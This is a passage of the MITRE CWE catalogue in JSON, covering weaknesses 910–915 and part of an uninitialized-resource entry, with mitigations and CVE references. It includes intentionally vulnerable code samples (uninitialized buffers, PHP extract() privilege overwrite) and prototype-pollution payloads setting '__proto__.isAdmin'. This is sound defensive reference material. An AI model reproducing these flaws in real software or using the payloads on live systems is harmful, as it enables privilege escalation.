          "Ordinality": "Primary"
        },
        {
          "Ordinality": "Resultant"
        }
      ],
      "ApplicablePlatforms": [
        {
          "Type": "Language",
          "Class": "Not Language-Specific",
          "Prevalence": "Undetermined"
        }
      ],
      "ModesOfIntroduction": [
        {
          "Phase": "Implementation"
        }
      ],
      "CommonConsequences": [
        {
          "Scope": [
            "Confidentiality"
          ],
          "Impact": [
            "Read Memory",
            "Read Application Data"
          ],
          "Note": "When reusing a resource such as memory or a program variable, the original contents of that resource may not be cleared before it is sent to an untrusted party."
        },
        {
          "Scope": [
            "Availability"
          ],
          "Impact": [
            "DoS: Crash, Exit, or Restart"
          ],
          "Note": "The uninitialized resource may contain values that cause program flow to change in ways that the programmer did not intend."
        }
      ],
      "PotentialMitigations": [
        {
          "Phase": [
            "Implementation"
          ],
          "Description": "Explicitly initialize the resource before use. If this is performed through an API function or standard procedure, follow all specified steps."
        },
        {
          "Phase": [
            "Implementation"
          ],
          "Description": "Pay close attention to complex conditionals that affect initialization, since some branches might not perform the initialization."
        },
        {
          "Phase": [
            "Implementation"
          ],
          "Description": "Avoid race conditions (CWE-362) during initialization routines."
        },
        {
          "Phase": [
            "Build and Compilation"
          ],
          "Description": "Run or compile your product with settings that generate warnings about uninitialized variables or data."
        }
      ],
      "DemonstrativeExamples": [
        {
          "ID": "DX-105",
          "Entries": [
            {
              "IntroText": "Here, a boolean initiailized field is consulted to ensure that initialization tasks are only completed once. However, the field is mistakenly set to true during static initialization, so the initialization code is never reached."
            },
            {
              "Nature": "Bad",
              "Language": "Java",
              "ExampleCode": "```\n\tprivate boolean initialized = true;\n\tpublic void someMethod() {\n\t\t\tif (!initialized) {\n```\n// perform initialization tasks* \n\t\t\t\t\t...\n\t\t\t\t\t\n\t\t\t\t\tinitialized = true;}"
            }
          ]
        },
        {
          "ID": "DX-54",
          "Entries": [
            {
              "IntroText": "The following code intends to limit certain operations to the administrator only."
            },
            {
              "Nature": "Bad",
              "Language": "Perl",
              "ExampleCode": "```\n\t$username = GetCurrentUser();\n\t$state = GetStateData($username);\n\tif (defined($state)) {\n\t\t$uid = ExtractUserID($state);\n\t}\n```\n# do stuff* \n\tif ($uid == 0) {\n\t```\n\t\tDoAdminThings();\n\t}\n```"
            },
            {
              "BodyText": "If the application is unable to extract the state information - say, due to a database timeout - then the $uid variable will not be explicitly set by the programmer. This will cause $uid to be regarded as equivalent to \"0\" in the conditional, allowing the original user to perform administrator actions. Even if the attacker cannot directly influence the state data, unexpected errors could cause incorrect privileges to be assigned to a user just by accident."
            }
          ]
        },
        {
          "Entries": [
            {
              "IntroText": "The following code intends to concatenate a string to a variable and print the string."
            },
            {
              "Nature": "Bad",
              "Language": "C",
              "ExampleCode": "```\n\tchar str[20];\n\tstrcat(str, \"hello world\");\n\tprintf(\"%s\", str);\n```"
            },
            {
              "BodyText": "This might seem innocent enough, but str was not initialized, so it contains random memory. As a result, str[0] might not contain the null terminator, so the copy might start at an offset other than 0. The consequences can vary, depending on the underlying memory."
            },
            {
              "BodyText": "If a null terminator is found before str[8], then some bytes of random garbage will be printed before the \"hello world\" string. The memory might contain sensitive information from previous uses, such as a password (which might occur as a result of CWE-14 or CWE-244). In this example, it might not be a big deal, but consider what could happen if large amounts of memory are printed out before the null terminator is found."
            },
            {
              "BodyText": "If a null terminator isn't found before str[8], then a buffer overflow could occur, since strcat will first look for the null terminator, then copy 12 bytes starting with that location. Alternately, a buffer over-read might occur (CWE-126) if a null terminator isn't found before the end of the memory segment is reached, leading to a segmentation fault and crash."
            }
          ]
        },
        {
          "ID": "DX-144",
          "Entries": [
            {
              "IntroText": "This example will leave test_string in an unknown condition when i is the same value as err_val, because test_string is not initialized (CWE-456). Depending on where this code segment appears (e.g. within a function body), test_string might be random if it is stored on the heap or stack. If the variable is declared in static memory, it might be zero or NULL. Compiler optimization might contribute to the unpredictability of this address."
            },
            {
              "Nature": "Bad",
              "Language": "C",
              "ExampleCode": "char *test_string;\n if (i != err_val)\n {\n\n```\n\ttest_string = \"Hello World!\";\n }\n printf(\"%s\", test_string);\n```"
            },
            {
              "BodyText": "When the printf() is reached, test_string might be an unexpected address, so the printf might print junk strings (CWE-457).\n\n\n To fix this code, there are a couple approaches to making sure that test_string has been properly set once it reaches the printf().\n\n\nOne solution would be to set test_string to an acceptable default before the conditional:"
            },
            {
              "Nature": "Good",
              "Language": "C",
              "ExampleCode": "char *test_string = \"Done at the beginning\";\n if (i != err_val)\n {\n\n```\n\ttest_string = \"Hello World!\";\n }\n printf(\"%s\", test_string);\n```"
            },
            {
              "BodyText": "Another solution is to ensure that each branch of the conditional - including the default/else branch - could ensure that test_string is set:"
            },
            {
              "Nature": "Good",
              "Language": "C",
              "ExampleCode": "char *test_string;\n if (i != err_val)\n {\n\n```\n\ttest_string = \"Hello World!\";\n }\n else {\n\ttest_string = \"Done on the other side!\";\n }\n printf(\"%s\", test_string);\n```"
            }
          ]
        }
      ],
      "ObservedExamples": [
        {
          "Reference": "CVE-2020-20739",
          "Description": "A variable that has its value set in a conditional statement is sometimes used when the conditional fails, sometimes causing data leakage",
          "Link": "https://www.cve.org/CVERecord?id=CVE-2020-20739"
        },
        {
          "Reference": "CVE-2005-1036",
          "Description": "Chain: Bypass of access restrictions due to improper authorization (CWE-862) of a user results from an improperly initialized (CWE-909) I/O permission bitmap",
          "Link": "https://www.cve.org/CVERecord?id=CVE-2005-1036"
        }
      ],
      "MappingNotes": {
        "Usage": "Allowed-with-Review",
        "Rationale": "This CWE entry is a Class and might have Base-level children that would be more appropriate",
        "Comments": "Examine children of this entry to see if there is a better fit",
        "Reasons": [
          "Abstraction"
        ]
      }
    },
    {
      "ID": "910",
      "Name": "Use of Expired File Descriptor",
      "Abstraction": "Base",
      "Structure": "Simple",
      "Status": "Incomplete",
      "Description": "The product uses or accesses a file descriptor after it has been closed.",
      "ExtendedDescription": "After a file descriptor for a particular file or device has been released, it can be reused. The code might not write to the original file, since the reused file descriptor might reference a different file or device.",
      "LikelihoodOfExploit": "Medium",
      "RelatedWeaknesses": [
        {
          "Nature": "ChildOf",
          "CweID": "672",
          "ViewID": "1000",
          "Ordinal": "Primary"
        }
      ],
      "WeaknessOrdinalities": [
        {
          "Ordinality": "Primary"
        },
        {
          "Ordinality": "Resultant"
        }
      ],
      "ApplicablePlatforms": [
        {
          "Type": "Language",
          "Name": "C",
          "Prevalence": "Sometimes"
        },
        {
          "Type": "Language",
          "Name": "C++",
          "Prevalence": "Sometimes"
        },
        {
          "Type": "Language",
          "Class": "Not Language-Specific",
          "Prevalence": "Undetermined"
        }
      ],
      "AlternateTerms": [
        {
          "Term": "Stale file descriptor"
        }
      ],
      "ModesOfIntroduction": [
        {
          "Phase": "Implementation"
        }
      ],
      "CommonConsequences": [
        {
          "Scope": [
            "Confidentiality"
          ],
          "Impact": [
            "Read Files or Directories"
          ],
          "Note": "The program could read data from the wrong file."
        },
        {
          "Scope": [
            "Availability"
          ],
          "Impact": [
            "DoS: Crash, Exit, or Restart"
          ],
          "Note": "Accessing a file descriptor that has been closed can cause a crash."
        }
      ],
      "TaxonomyMappings": [
        {
          "TaxonomyName": "CERT C Secure Coding",
          "EntryID": "FIO46-C",
          "EntryName": "Do not access a closed file",
          "MappingFit": "Exact"
        }
      ],
      "MappingNotes": {
        "Usage": "Allowed",
        "Rationale": "This CWE entry is at the Base level of abstraction, which is a preferred level of abstraction for mapping to the root causes of vulnerabilities.",
        "Comments": "Carefully read both the name and description to ensure that this mapping is an appropriate fit. Do not try to 'force' a mapping to a lower-level Base/Variant simply to comply with this preferred level of abstraction.",
        "Reasons": [
          "Acceptable-Use"
        ]
      }
    },
    {
      "ID": "911",
      "Name": "Improper Update of Reference Count",
      "Abstraction": "Base",
      "Structure": "Simple",
      "Status": "Incomplete",
      "Description": "The product uses a reference count to manage a resource, but it does not update or incorrectly updates the reference count.",
      "ExtendedDescription": "Reference counts can be used when tracking how many objects contain a reference to a particular resource, such as in memory management or garbage collection. When the reference count reaches zero, the resource can be de-allocated or reused because there are no more objects that use it. If the reference count accidentally reaches zero, then the resource might be released too soon, even though it is still in use. If all objects no longer use the resource, but the reference count is not zero, then the resource might not ever be released.",
      "LikelihoodOfExploit": "Medium",
      "RelatedWeaknesses": [
        {
          "Nature": "ChildOf",
          "CweID": "664",
          "ViewID": "1000",
          "Ordinal": "Primary"
        },
        {
          "Nature": "CanPrecede",
          "CweID": "672",
          "ViewID": "1000"
        },
        {
          "Nature": "CanPrecede",
          "CweID": "772",
          "ViewID": "1000"
        }
      ],
      "WeaknessOrdinalities": [
        {
          "Ordinality": "Primary"
        }
      ],
      "ApplicablePlatforms": [
        {
          "Type": "Language",
          "Name": "C",
          "Prevalence": "Sometimes"
        },
        {
          "Type": "Language",
          "Name": "C++",
          "Prevalence": "Sometimes"
        },
        {
          "Type": "Language",
          "Class": "Not Language-Specific",
          "Prevalence": "Undetermined"
        }
      ],
      "ModesOfIntroduction": [
        {
          "Phase": "Implementation"
        }
      ],
      "ObservedExamples": [
        {
          "Reference": "CVE-2002-0574",
          "Description": "chain: reference count is not decremented, leading to memory leak in OS by sending ICMP packets.",
          "Link": "https://www.cve.org/CVERecord?id=CVE-2002-0574"
        },
        {
          "Reference": "CVE-2004-0114",
          "Description": "Reference count for shared memory not decremented when a function fails, potentially allowing unprivileged users to read kernel memory.",
          "Link": "https://www.cve.org/CVERecord?id=CVE-2004-0114"
        },
        {
          "Reference": "CVE-2006-3741",
          "Description": "chain: improper reference count tracking leads to file descriptor consumption",
          "Link": "https://www.cve.org/CVERecord?id=CVE-2006-3741"
        },
        {
          "Reference": "CVE-2007-1383",
          "Description": "chain: integer overflow in reference counter causes the same variable to be destroyed twice.",
          "Link": "https://www.cve.org/CVERecord?id=CVE-2007-1383"
        },
        {
          "Reference": "CVE-2007-1700",
          "Description": "Incorrect reference count calculation leads to improper object destruction and code execution.",
          "Link": "https://www.cve.org/CVERecord?id=CVE-2007-1700"
        },
        {
          "Reference": "CVE-2008-2136",
          "Description": "chain: incorrect update of reference count leads to memory leak.",
          "Link": "https://www.cve.org/CVERecord?id=CVE-2008-2136"
        },
        {
          "Reference": "CVE-2008-2785",
          "Description": "chain/composite: use of incorrect data type for a reference counter allows an overflow of the counter, leading to a free of memory that is still in use.",
          "Link": "https://www.cve.org/CVERecord?id=CVE-2008-2785"
        },
        {
          "Reference": "CVE-2008-5410",
          "Description": "Improper reference counting leads to failure of cryptographic operations.",
          "Link": "https://www.cve.org/CVERecord?id=CVE-2008-5410"
        },
        {
          "Reference": "CVE-2009-1709",
          "Description": "chain: improper reference counting in a garbage collection routine leads to use-after-free",
          "Link": "https://www.cve.org/CVERecord?id=CVE-2009-1709"
        },
        {
          "Reference": "CVE-2009-3553",
          "Description": "chain: reference count not correctly maintained when client disconnects during a large operation, leading to a use-after-free.",
          "Link": "https://www.cve.org/CVERecord?id=CVE-2009-3553"
        },
        {
          "Reference": "CVE-2009-3624",
          "Description": "Reference count not always incremented, leading to crash or code execution.",
          "Link": "https://www.cve.org/CVERecord?id=CVE-2009-3624"
        },
        {
          "Reference": "CVE-2010-0176",
          "Description": "improper reference counting leads to expired pointer dereference.",
          "Link": "https://www.cve.org/CVERecord?id=CVE-2010-0176"
        },
        {
          "Reference": "CVE-2010-0623",
          "Description": "OS kernel increments reference count twice but only decrements once, leading to resource consumption and crash.",
          "Link": "https://www.cve.org/CVERecord?id=CVE-2010-0623"
        },
        {
          "Reference": "CVE-2010-2549",
          "Description": "OS kernel driver allows code execution",
          "Link": "https://www.cve.org/CVERecord?id=CVE-2010-2549"
        },
        {
          "Reference": "CVE-2010-4593",
          "Description": "improper reference counting leads to exhaustion of IP addresses",
          "Link": "https://www.cve.org/CVERecord?id=CVE-2010-4593"
        },
        {
          "Reference": "CVE-2011-0695",
          "Description": "Race condition causes reference counter to be decremented prematurely, leading to the destruction of still-active object and an invalid pointer dereference.",
          "Link": "https://www.cve.org/CVERecord?id=CVE-2011-0695"
        },
        {
          "Reference": "CVE-2012-4787",
          "Description": "improper reference counting leads to use-after-free",
          "Link": "https://www.cve.org/CVERecord?id=CVE-2012-4787"
        }
      ],
      "References": [
        {
          "ExternalReferenceID": "REF-884",
          "Authors": [
            "Mateusz \"j00ru\" Jurczyk"
          ],
          "Title": "Windows Kernel Reference Count Vulnerabilities - Case Study",
          "PublicationYear": "2012",
          "PublicationMonth": "11",
          "URL": "https://j00ru.vexillium.org/slides/2012/zeronights.pdf",
          "URLDate": "2023-04-07"
        }
      ],
      "MappingNotes": {
        "Usage": "Allowed",
        "Rationale": "This CWE entry is at the Base level of abstraction, which is a preferred level of abstraction for mapping to the root causes of vulnerabilities.",
        "Comments": "Carefully read both the name and description to ensure that this mapping is an appropriate fit. Do not try to 'force' a mapping to a lower-level Base/Variant simply to comply with this preferred level of abstraction.",
        "Reasons": [
          "Acceptable-Use"
        ]
      }
    },
    {
      "ID": "912",
      "Name": "Hidden Functionality",
      "Abstraction": "Class",
      "Structure": "Simple",
      "Status": "Incomplete",
      "Description": "The product contains functionality that is not documented, not part of the specification, and not accessible through an interface or command sequence that is obvious to the product's users or administrators.",
      "ExtendedDescription": "Hidden functionality can take many forms, such as intentionally malicious code, \"Easter Eggs\" that contain extraneous functionality such as games, developer-friendly shortcuts that reduce maintenance or support costs such as hard-coded accounts, etc. From a security perspective, even when the functionality is not intentionally malicious or damaging, it can increase the product's attack surface and expose additional weaknesses beyond what is already exposed by the intended functionality. Even if it is not easily accessible, the hidden functionality could be useful for attacks that modify the control flow of the application.",
      "RelatedWeaknesses": [
        {
          "Nature": "ChildOf",
          "CweID": "684",
          "ViewID": "1000",
          "Ordinal": "Primary"
        }
      ],
      "ApplicablePlatforms": [
        {
          "Type": "Technology",
          "Class": "Not Technology-Specific",
          "Prevalence": "Undetermined"
        },
        {
          "Type": "Technology",
          "Class": "ICS/OT",
          "Prevalence": "Undetermined"
        }
      ],
      "ModesOfIntroduction": [
        {
          "Phase": "Architecture and Design"
        },
        {
          "Phase": "Implementation"
        }
      ],
      "CommonConsequences": [
        {
          "Scope": [
            "Other",
            "Integrity"
          ],
          "Impact": [
            "Varies by Context",
            "Alter Execution Logic"
          ]
        }
      ],
      "PotentialMitigations": [
        {
          "Phase": [
            "Installation"
          ],
          "Description": "Always verify the integrity of the product that is being installed."
        },
        {
          "Phase": [
            "Testing"
          ],
          "Description": "Conduct a code coverage analysis using live testing, then closely inspect any code that is not covered."
        }
      ],
      "ObservedExamples": [
        {
          "Reference": "CVE-2022-31260",
          "Description": "Chain: a digital asset management program has an undisclosed backdoor in the legacy version of a PHP script (CWE-912) that could allow an unauthenticated user to export metadata (CWE-306)",
          "Link": "https://www.cve.org/CVERecord?id=CVE-2022-31260"
        },
        {
          "Reference": "CVE-2022-3203",
          "Description": "A wireless access point manual specifies that the only method of configuration is via web interface (CWE-1059), but there is an undisclosed telnet server that was activated by default (CWE-912).",
          "Link": "https://www.cve.org/CVERecord?id=CVE-2022-3203"
        }
      ],
      "RelatedAttackPatterns": [
        "133",
        "190"
      ],
      "MappingNotes": {
        "Usage": "Allowed-with-Review",
        "Rationale": "This CWE entry is a Class and might have Base-level children that would be more appropriate",
        "Comments": "Examine children of this entry to see if there is a better fit",
        "Reasons": [
          "Abstraction"
        ]
      }
    },
    {
      "ID": "913",
      "Name": "Improper Control of Dynamically-Managed Code Resources",
      "Abstraction": "Class",
      "Structure": "Simple",
      "Status": "Incomplete",
      "Description": "The product does not properly restrict reading from or writing to dynamically-managed code resources such as variables, objects, classes, attributes, functions, or executable instructions or statements.",
      "ExtendedDescription": "Many languages offer powerful features that allow the programmer to dynamically create or modify existing code, or resources used by code such as variables and objects. While these features can offer significant flexibility and reduce development time, they can be extremely dangerous if attackers can directly influence these code resources in unexpected ways.",
      "RelatedWeaknesses": [
        {
          "Nature": "ChildOf",
          "CweID": "664",
          "ViewID": "1000",
          "Ordinal": "Primary"
        }
      ],
      "ModesOfIntroduction": [
        {
          "Phase": "Architecture and Design"
        },
        {
          "Phase": "Implementation"
        }
      ],
      "CommonConsequences": [
        {
          "Scope": [
            "Integrity"
          ],
          "Impact": [
            "Execute Unauthorized Code or Commands"
          ]
        },
        {
          "Scope": [
            "Other",
            "Integrity"
          ],
          "Impact": [
            "Varies by Context",
            "Alter Execution Logic"
          ]
        }
      ],
      "DetectionMethods": [
        {
          "DetectionMethodID": "DM-13",
          "Method": "Fuzzing",
          "Description": "Fuzz testing (fuzzing) is a powerful technique for generating large numbers of diverse inputs - either randomly or algorithmically - and dynamically invoking the code with those inputs. Even with random inputs, it is often capable of generating unexpected results such as crashes, memory corruption, or resource consumption. Fuzzing effectively produces repeatable test cases that clearly indicate bugs, which helps developers to diagnose the issues.",
          "Effectiveness": "High"
        }
      ],
      "PotentialMitigations": [
        {
          "Phase": [
            "Implementation"
          ],
          "Strategy": "Input Validation",
          "Description": "For any externally-influenced input, check the input against an allowlist of acceptable values."
        },
        {
          "Phase": [
            "Implementation",
            "Architecture and Design"
          ],
          "Strategy": "Refactoring",
          "Description": "Refactor the code so that it does not need to be dynamically managed."
        }
      ],
      "ObservedExamples": [
        {
          "Reference": "CVE-2022-2054",
          "Description": "Python compiler uses eval() to execute malicious strings as Python code.",
          "Link": "https://www.cve.org/CVERecord?id=CVE-2022-2054"
        },
        {
          "Reference": "CVE-2018-1000613",
          "Description": "Cryptography API uses unsafe reflection when deserializing a private key",
          "Link": "https://www.cve.org/CVERecord?id=CVE-2018-1000613"
        },
        {
          "Reference": "CVE-2015-8103",
          "Description": "Deserialization issue in commonly-used Java library allows remote execution.",
          "Link": "https://www.cve.org/CVERecord?id=CVE-2015-8103"
        },
        {
          "Reference": "CVE-2006-7079",
          "Description": "Chain: extract used for register_globals compatibility layer, enables path traversal (CWE-22)",
          "Link": "https://www.cve.org/CVERecord?id=CVE-2006-7079"
        },
        {
          "Reference": "CVE-2012-2055",
          "Description": "Source version control product allows modification of trusted key using mass assignment.",
          "Link": "https://www.cve.org/CVERecord?id=CVE-2012-2055"
        }
      ],
      "MappingNotes": {
        "Usage": "Allowed-with-Review",
        "Rationale": "This CWE entry is a Class and might have Base-level children that would be more appropriate",
        "Comments": "Examine children of this entry to see if there is a better fit",
        "Reasons": [
          "Abstraction"
        ]
      }
    },
    {
      "ID": "914",
      "Name": "Improper Control of Dynamically-Identified Variables",
      "Abstraction": "Base",
      "Structure": "Simple",
      "Status": "Incomplete",
      "Description": "The product does not properly restrict reading from or writing to dynamically-identified variables.",
      "ExtendedDescription": "Many languages offer powerful features that allow the programmer to access arbitrary variables that are specified by an input string. While these features can offer significant flexibility and reduce development time, they can be extremely dangerous if attackers can modify unintended variables that have security implications.",
      "RelatedWeaknesses": [
        {
          "Nature": "ChildOf",
          "CweID": "99",
          "ViewID": "1000",
          "Ordinal": "Primary"
        },
        {
          "Nature": "ChildOf",
          "CweID": "913",
          "ViewID": "1000"
        }
      ],
      "WeaknessOrdinalities": [
        {
          "Ordinality": "Primary"
        }
      ],
      "ModesOfIntroduction": [
        {
          "Phase": "Implementation"
        }
      ],
      "CommonConsequences": [
        {
          "Scope": [
            "Integrity"
          ],
          "Impact": [
            "Modify Application Data"
          ],
          "Note": "An attacker could modify sensitive data or program variables."
        },
        {
          "Scope": [
            "Integrity"
          ],
          "Impact": [
            "Execute Unauthorized Code or Commands"
          ]
        },
        {
          "Scope": [
            "Other",
            "Integrity"
          ],
          "Impact": [
            "Varies by Context",
            "Alter Execution Logic"
          ]
        }
      ],
      "PotentialMitigations": [
        {
          "Phase": [
            "Implementation"
          ],
          "Strategy": "Input Validation",
          "Description": "For any externally-influenced input, check the input against an allowlist of internal program variables that are allowed to be modified."
        },
        {
          "Phase": [
            "Implementation",
            "Architecture and Design"
          ],
          "Strategy": "Refactoring",
          "Description": "Refactor the code so that internal program variables do not need to be dynamically identified."
        }
      ],
      "DemonstrativeExamples": [
        {
          "ID": "DX-107",
          "Entries": [
            {
              "IntroText": "This code uses the credentials sent in a POST request to login a user."
            },
            {
              "Nature": "Bad",
              "Language": "PHP",
              "ExampleCode": "```\n```\n//Log user in, and set $isAdmin to true if user is an administrator* \n\t\n\tfunction login($user,$pass){\n\t```\n\t\t$query = buildQuery($user,$pass);\n\t\tmysql_query($query);\n\t\tif(getUserRole($user) == \"Admin\"){\n\t\t\t$isAdmin = true;\n\t\t}\n\t}\n\t$isAdmin = false;\n\textract($_POST);\n\tlogin(mysql_real_escape_string($user),mysql_real_escape_string($pass));\n```"
            },
            {
              "BodyText": "The call to extract() will overwrite the existing values of any variables defined previously, in this case $isAdmin. An attacker can send a POST request with an unexpected third value \"isAdmin\" equal to \"true\", thus gaining Admin privileges."
            }
          ]
        }
      ],
      "ObservedExamples": [
        {
          "Reference": "CVE-2006-7135",
          "Description": "extract issue enables file inclusion",
          "Link": "https://www.cve.org/CVERecord?id=CVE-2006-7135"
        },
        {
          "Reference": "CVE-2006-7079",
          "Description": "Chain: extract used for register_globals compatibility layer, enables path traversal (CWE-22)",
          "Link": "https://www.cve.org/CVERecord?id=CVE-2006-7079"
        },
        {
          "Reference": "CVE-2007-0649",
          "Description": "extract() buried in include files makes post-disclosure analysis confusing; original report had seemed incorrect.",
          "Link": "https://www.cve.org/CVERecord?id=CVE-2007-0649"
        },
        {
          "Reference": "CVE-2006-6661",
          "Description": "extract() enables static code injection",
          "Link": "https://www.cve.org/CVERecord?id=CVE-2006-6661"
        },
        {
          "Reference": "CVE-2006-2828",
          "Description": "import_request_variables() buried in include files makes post-disclosure analysis confusing",
          "Link": "https://www.cve.org/CVERecord?id=CVE-2006-2828"
        },
        {
          "Reference": "CVE-2009-0422",
          "Description": "Chain: Dynamic variable evaluation allows resultant remote file inclusion and path traversal.",
          "Link": "https://www.cve.org/CVERecord?id=CVE-2009-0422"
        },
        {
          "Reference": "CVE-2007-2431",
          "Description": "Chain: dynamic variable evaluation in PHP program used to modify critical, unexpected $_SERVER variable for resultant XSS.",
          "Link": "https://www.cve.org/CVERecord?id=CVE-2007-2431"
        },
        {
          "Reference": "CVE-2006-4904",
          "Description": "Chain: dynamic variable evaluation in PHP program used to conduct remote file inclusion.",
          "Link": "https://www.cve.org/CVERecord?id=CVE-2006-4904"
        },
        {
          "Reference": "CVE-2006-4019",
          "Description": "Dynamic variable evaluation in mail program allows reading and modifying attachments and preferences of other users.",
          "Link": "https://www.cve.org/CVERecord?id=CVE-2006-4019"
        }
      ],
      "MappingNotes": {
        "Usage": "Allowed",
        "Rationale": "This CWE entry is at the Base level of abstraction, which is a preferred level of abstraction for mapping to the root causes of vulnerabilities.",
        "Comments": "Carefully read both the name and description to ensure that this mapping is an appropriate fit. Do not try to 'force' a mapping to a lower-level Base/Variant simply to comply with this preferred level of abstraction.",
        "Reasons": [
          "Acceptable-Use"
        ]
      }
    },
    {
      "ID": "915",
      "Name": "Improperly Controlled Modification of Dynamically-Determined Object Attributes",
      "Abstraction": "Base",
      "Structure": "Simple",
      "Status": "Incomplete",
      "Description": "The product receives input from an upstream component that specifies multiple attributes, properties, or fields that are to be initialized or updated in an object, but it does not properly control which attributes can be modified.",
      "ExtendedDescription": "\n\nIf the object contains attributes that were only intended for internal use, then their unexpected modification could lead to a vulnerability.\n\n\nThis weakness is sometimes known by the language-specific mechanisms that make it possible, such as mass assignment, autobinding, or object injection.\n",
      "RelatedWeaknesses": [
        {
          "Nature": "ChildOf",
          "CweID": "913",
          "ViewID": "1000",
          "Ordinal": "Primary"
        },
        {
          "Nature": "PeerOf",
          "CweID": "502",
          "ViewID": "1000"
        }
      ],
      "WeaknessOrdinalities": [
        {
          "Ordinality": "Primary"
        }
      ],
      "ApplicablePlatforms": [
        {
          "Type": "Language",
          "Name": "Ruby",
          "Prevalence": "Undetermined"
        },
        {
          "Type": "Language",
          "Name": "ASP.NET",
          "Prevalence": "Undetermined"
        },
        {
          "Type": "Language",
          "Name": "PHP",
          "Prevalence": "Undetermined"
        },
        {
          "Type": "Language",
          "Name": "Python",
          "Prevalence": "Undetermined"
        },
        {
          "Type": "Language",
          "Class": "Not Language-Specific",
          "Prevalence": "Undetermined"
        }
      ],
      "AlternateTerms": [
        {
          "Term": "Mass Assignment",
          "Description": "\"Mass assignment\" is the name of a feature in Ruby on Rails that allows simultaneous modification of multiple object attributes."
        },
        {
          "Term": "AutoBinding",
          "Description": "The \"Autobinding\" term is used in frameworks such as Spring MVC and ASP.NET MVC."
        },
        {
          "Term": "PHP Object Injection",
          "Description": "Some PHP application researchers use this term for attacking unsafe use of the unserialize() function, but it is also used for CWE-502."
        }
      ],
      "ModesOfIntroduction": [
        {
          "Phase": "Architecture and Design"
        },
        {
          "Phase": "Implementation"
        }
      ],
      "CommonConsequences": [
        {
          "Scope": [
            "Integrity"
          ],
          "Impact": [
            "Modify Application Data"
          ],
          "Note": "An attacker could modify sensitive data or program variables."
        },
        {
          "Scope": [
            "Integrity"
          ],
          "Impact": [
            "Execute Unauthorized Code or Commands"
          ]
        },
        {
          "Scope": [
            "Other",
            "Integrity"
          ],
          "Impact": [
            "Varies by Context",
            "Alter Execution Logic"
          ]
        }
      ],
      "DetectionMethods": [
        {
          "DetectionMethodID": "DM-14",
          "Method": "Automated Static Analysis",
          "Description": "Automated static analysis, commonly referred to as Static Application Security Testing (SAST), can find some instances of this weakness by analyzing source code (or binary/compiled code) without having to execute it. Typically, this is done by building a model of data flow and control flow, then searching for potentially-vulnerable patterns that connect \"sources\" (origins of input) with \"sinks\" (destinations where the data interacts with external components, a lower layer such as the OS, etc.)",
          "Effectiveness": "High"
        }
      ],
      "PotentialMitigations": [
        {
          "Phase": [
            "Implementation"
          ],
          "Description": "\n\nIf available, use features of the language or framework that allow specification of allowlists of attributes or fields that are allowed to be modified. If possible, prefer allowlists over denylists.\n\n\nFor applications written with Ruby on Rails, use the attr_accessible (allowlist) or attr_protected (denylist) macros in each class that may be used in mass assignment.\n"
        },
        {
          "Phase": [
            "Architecture and Design",
            "Implementation"
          ],
          "Description": "If available, use the signing/sealing features of the programming language to assure that deserialized data has not been tainted. For example, a hash-based message authentication code (HMAC) could be used to ensure that data has not been modified."
        },
        {
          "Phase": [
            "Implementation"
          ],
          "Strategy": "Input Validation",
          "Description": "For any externally-influenced input, check the input against an allowlist of internal object attributes or fields that are allowed to be modified."
        },
        {
          "Phase": [
            "Implementation",
            "Architecture and Design"
          ],
          "Strategy": "Refactoring",
          "Description": "Refactor the code so that object attributes or fields do not need to be dynamically identified, and only expose getter/setter functionality for the intended attributes."
        }
      ],
      "DemonstrativeExamples": [
        {
          "ID": "DX-206",
          "Entries": [
            {
              "IntroText": "This function sets object attributes based on a dot-separated path."
            },
            {
              "Nature": "Bad",
              "Language": "JavaScript",
              "ExampleCode": "```\n\tfunction setValueByPath (object, path, value) {\n\t\t const pathArray = path.split(\".\");\n\t\t const attributeToSet = pathArray.pop();\n\t\t let objectToModify = object;\n\t\t for (const attr of pathArray) {\n\t\t\tif (typeof objectToModify[attr] !== 'object') {\n\t\t\t\tobjectToModify[attr] = {};\n\t\t\t\t }\n\t\t\t objectToModify = objectToModify[attr];\n\t\t\t }\n\t\t objectToModify[attributeToSet] = value;\n\t\t return object;\n\t\t }\n```"
            },
            {
              "BodyText": "This function does not check if the attribute resolves to the object prototype. These codes can be used to add \"isAdmin: true\" to the object prototype."
            },
            {
              "Nature": "Bad",
              "Language": "JavaScript",
              "ExampleCode": "```\n\t setValueByPath({}, \"__proto__.isAdmin\", true)\n\t setValueByPath({}, \"constructor.prototype.isAdmin\", true)\n```"
            },
            {
              "BodyText": "By using a denylist of dangerous attributes, this weakness can be eliminated."
            },
            {
              "Nature": "Good",
              "Language": "JavaScript",
              "ExampleCode": "```\n\t function setValueByPath (object, path, value) {\n\t\t const pathArray = path.split(\".\");\n\t\t const attributeToSet = pathArray.pop();\n\t\t let objectToModify = object;\n\t\t for (const attr of pathArray) {\n```\n// Ignore attributes which resolve to object prototype* \n\t\t\t if (attr === \"__proto__\" || attr === \"constructor\" || attr === \"prototype\") {\n\t\t\t\n\t\t\t```\n\t\t\t\t continue;\n\t\t\t\t }\n\t\t\t if (typeof objectToModify[attr] !== \"object\") {\n\t\t\t\t objectToModify[attr] = {};\n\t\t\t\t }\n\t\t\t objectToModify = objectToModify[attr];\n\t\t\t }\n\t\t objectToModify[attributeToSet] = value;\n\t\t return object;\n\t\t }\n```"
            }
          ]
        }
      ],
      "ObservedExamples": [
        {
          "Reference": "CVE-2024-3283",
          "Description": "Application for using LLMs allows modification of a sensitive variable using mass assignment.",
          "Link": "https://www.cve.org/CVERecord?id=CVE-2024-3283"
        },
        {
          "Reference": "CVE-2012-2054",
          "Description": "Mass assignment allows modification of arbitrary attributes using modified URL.",
          "Link": "https://www.cve.org/CVERecord?id=CVE-2012-2054"
        },
        {
          "Reference": "CVE-2012-2055",
          "Description": "Source version control product allows modification of trusted key using mass assignment.",
          "Link": "https://www.cve.org/CVERecord?id=CVE-2012-2055"
        },
        {
          "Reference": "CVE-2008-7310",
          "Description": "Attackers can bypass payment step in e-commerce product.",
          "Link": "https://www.cve.org/CVERecord?id=CVE-2008-7310"
        },
        {
          "Reference": "CVE-2013-1465",
          "Description": "Use of PHP unserialize function on untrusted input allows attacker to modify application configuration.",
          "Link": "https://www.cve.org/CVERecord?id=CVE-2013-1465"
        },
        {
          "Reference": "CVE-2012-3527",
          "Description": "Use of PHP unserialize function on untrusted input in content management system might allow code execution.",
          "Link": "https://www.cve.org/CVERecord?id=CVE-2012-3527"
        },
        {
          "Reference": "CVE-2012-0911",
          "Description": "Use of PHP unserialize function on untrusted input in content management system allows code execution using a crafted cookie value.",
          "Link": "https://www.cve.org/CVERecord?id=CVE-2012-0911"
        },
        {
          "Reference": "CVE-2012-0911",
